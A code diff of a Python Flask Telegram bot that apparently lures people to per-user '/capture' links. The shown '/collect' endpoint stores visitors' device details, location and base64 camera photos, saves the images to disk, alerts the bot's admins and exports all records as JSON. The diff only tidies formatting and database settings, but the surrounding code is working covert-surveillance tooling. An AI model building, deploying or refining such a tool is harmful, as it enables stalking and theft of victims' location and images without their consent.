@@ -27,13 +27,17 @@ app.pending_broadcast = {}
 DB_PATH = "bot_data.db"
 
 def get_db():
-    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
+    conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
     conn.row_factory = sqlite3.Row
+    conn.execute("PRAGMA journal_mode=WAL")
+    conn.execute("PRAGMA busy_timeout=5000")
     return conn
 
 def init_db():
     conn = get_db()
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL")
+    c.execute("PRAGMA busy_timeout=5000")
     c.executescript('''
         CREATE TABLE IF NOT EXISTS users (
             chat_id INTEGER PRIMARY KEY,
@@ -112,25 +116,31 @@ def save_collected_data(chat_id, device_info, location, photos, additional):
     update_stat("total_visits", get_stat("total_visits") + 1)
 
 def get_all_users():
-    conn = get_db(); c = conn.cursor()
+    conn = get_db()
+    c = conn.cursor()
     c.execute("SELECT * FROM users ORDER BY last_seen DESC")
     rows = [dict(r) for r in c.fetchall()]
-    conn.close(); return rows
+    conn.close()
+    return rows
 
 def get_recent_data(limit=10):
-    conn = get_db(); c = conn.cursor()
+    conn = get_db()
+    c = conn.cursor()
     c.execute("SELECT * FROM collected_data ORDER BY id DESC LIMIT ?", (limit,))
     rows = [dict(r) for r in c.fetchall()]
-    conn.close(); return rows
+    conn.close()
+    return rows
 
 def export_all_data():
-    conn = get_db(); c = conn.cursor()
+    conn = get_db()
+    c = conn.cursor()
     c.execute("SELECT * FROM collected_data ORDER BY id DESC")
     result = []
     for r in c.fetchall():
         d = dict(r)
         for field in ["device_info","location","photos","additional"]:
-            if d.get(field): d[field] = json.loads(d[field])
+            if d.get(field):
+                d[field] = json.loads(d[field])
         result.append(d)
     conn.close()
     return result
@@ -139,7 +149,8 @@ def export_all_data():
 
 def send_msg(chat_id, text, parse_mode="Markdown", reply_markup=None):
     data = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": True}
-    if reply_markup: data["reply_markup"] = json.dumps(reply_markup)
+    if reply_markup:
+        data["reply_markup"] = json.dumps(reply_markup)
     try:
         return requests.post(f"{TELEGRAM_API}/sendMessage", data=data, timeout=10).json()
     except Exception as e:
@@ -171,7 +182,8 @@ def send_doc(chat_id, filepath, caption=""):
 
 def edit_msg(chat_id, msg_id, text, parse_mode="Markdown", reply_markup=None):
     data = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": parse_mode}
-    if reply_markup: data["reply_markup"] = json.dumps(reply_markup)
+    if reply_markup:
+        data["reply_markup"] = json.dumps(reply_markup)
     try:
         return requests.post(f"{TELEGRAM_API}/editMessageText", data=data, timeout=10).json()
     except Exception as e:
@@ -221,7 +233,8 @@ def handle_photo_received(chat_id, file_id):
         img_resp = requests.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}", timeout=15)
         os.makedirs("photos", exist_ok=True)
         local_path = f"photos/{chat_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
-        with open(local_path, "wb") as f: f.write(img_resp.content)
+        with open(local_path, "wb") as f:
+            f.write(img_resp.content)
         
         unique_hash = hashlib.md5(f"{chat_id}_{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
         cap_link = f"{BASE_URL}/capture?chat_id={chat_id}&uid={unique_hash}"
@@ -236,7 +249,7 @@ def handle_photo_received(chat_id, file_id):
         return None
 
 def handle_callback(cb):
-    data = cb.get("data","")
+    data = cb.get("data", "")
     chat_id = cb["message"]["chat"]["id"]
     msg_id = cb["message"]["message_id"]
     cb_id = cb["id"]
@@ -288,7 +301,8 @@ def handle_callback(cb):
         data_list = export_all_data()
         os.makedirs("exports", exist_ok=True)
         fn = f"exports/export_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        with open(fn, "w") as f: json.dump(data_list, f, indent=2)
+        with open(fn, "w") as f:
+            json.dump(data_list, f, indent=2)
         send_doc(chat_id, fn, f"📤 {len(data_list)} records")
         edit_msg(chat_id, msg_id, f"✅ Exported {len(data_list)} records.")
         answer_cb(cb_id)
@@ -299,7 +313,9 @@ def handle_callback(cb):
         answer_cb(cb_id)
     
     elif data == "adm_reset":
-        update_stat("users_today", 0); update_stat("total_visits", 0); update_stat("total_data", 0)
+        update_stat("users_today", 0)
+        update_stat("total_visits", 0)
+        update_stat("total_data", 0)
         edit_msg(chat_id, msg_id, "✅ Stats reset!")
         answer_cb(cb_id)
 
@@ -314,13 +330,12 @@ def webhook():
         
         logger.info(f"Update: {json.dumps(update)[:200]}")
         
-        # Message
         if "message" in update:
             msg = update["message"]
             chat_id = msg["chat"]["id"]
-            text = msg.get("text","")
-            username = msg["from"].get("username","")
-            first_name = msg["from"].get("first_name","User")
+            text = msg.get("text", "")
+            username = msg["from"].get("username", "")
+            first_name = msg["from"].get("first_name", "User")
             
             if text == "/start":
                 handle_start(chat_id, username, first_name)
@@ -340,7 +355,6 @@ def webhook():
                         fail += 1
                 send_msg(chat_id, f"✅ Sent: {suc} | Failed: {fail}")
         
-        # Callback
         if "callback_query" in update:
             handle_callback(update["callback_query"])
         
@@ -544,15 +558,14 @@ def collect():
         
         save_collected_data(chat_id, device_info, location, photos, additional)
         
-        # Save photo files
         os.makedirs("captured_photos", exist_ok=True)
         for i, p in enumerate(photos):
             if p.get("data","").startswith("data:image"):
                 img = base64.b64decode(p["data"].split(",")[1])
                 fn = f"captured_photos/{chat_id}_{datetime.datetime.now().strftime('%H%M%S')}_{p.get('camera','x')}_{i}.jpg"
-                with open(fn, "wb") as f: f.write(img)
+                with open(fn, "wb") as f:
+                    f.write(img)
         
-        # Notify admin
         for aid in ADMIN_IDS:
             msg = (
                 f"📩 **New Data!**\n\n"
@@ -618,12 +631,10 @@ def delete_webhook():
     except Exception as e:
         return jsonify({"status":"error","message":str(e)})
 
-# ==================== SAFE STARTUP (GUNICORN COMPATIBLE) ====================
-# Yeh code Sirf TAB chalta hai jab python app.py se run karein
-# Render pe gunicorn istemal karta hai, toh yeh nahi chalega - isliye safe hai
+# ==================== STARTUP (GUNICORN COMPATIBLE) ====================
+
 if __name__ == "__main__":
     print("🚀 Running in development mode...")
-    print("⚠️ For production, use: gunicorn app:app")
     init_db()
     os.makedirs("photos", exist_ok=True)
     os.makedirs("captured_photos", exist_ok=True)
@@ -631,14 +642,13 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=True)
 else:
-    # Gunicorn ke saath: yeh tab chalta hai jab Render import karta hai
+    # Gunicorn mode
     print("🚀 Gunicorn mode: Initializing...")
     init_db()
     os.makedirs("photos", exist_ok=True)
     os.makedirs("captured_photos", exist_ok=True)
     os.makedirs("exports", exist_ok=True)
     
-    # Webhook auto-set agar Render URL available hai
     if RENDER_URL:
         wh_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
         try:
